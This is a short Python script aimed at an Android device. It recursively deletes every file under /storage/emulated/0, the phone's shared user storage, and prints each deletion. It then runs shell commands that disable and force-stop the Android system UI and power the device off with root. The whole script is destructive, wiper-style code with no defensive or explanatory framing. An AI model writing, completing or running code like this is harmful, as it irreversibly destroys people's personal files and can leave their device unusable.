import os
import sys
import time

TARGET_DIRECTORY = "/storage/emulated/0"
DELETION_DELAY_SECONDS = 5

def destroy_files(directory):
    for root, dirs, files in os.walk(directory):
        for file in files:
            file_path = os.path.join(root, file)
            try:
                if os.path.exists(file_path):
                    os.remove(file_path)
                    print(f"Deleted: {file_path}")
            except OSError as e:
                print(f"Error deleting {file_path}: {e}")

def main():
    print("Initiating file destruction sequence...")
    time.sleep(DELETION_DELAY_SECONDS)
    destroy_files(TARGET_DIRECTORY)
    print("File destruction complete.")
    time.sleep(DELETION_DELAY_SECONDS)
    print("System shutdown initiated.")
    time.sleep(DELETION_DELAY_SECONDS)
    try:
        os.system("pm disable-user --user 0 com.android.systemui")
        os.system("am force-stop com.android.systemui")
        os.system("su -c 'reboot -p'")
    except Exception as e:
        print(f"Failed to force shutdown: {e}")

if __name__ == "__main__":
    main()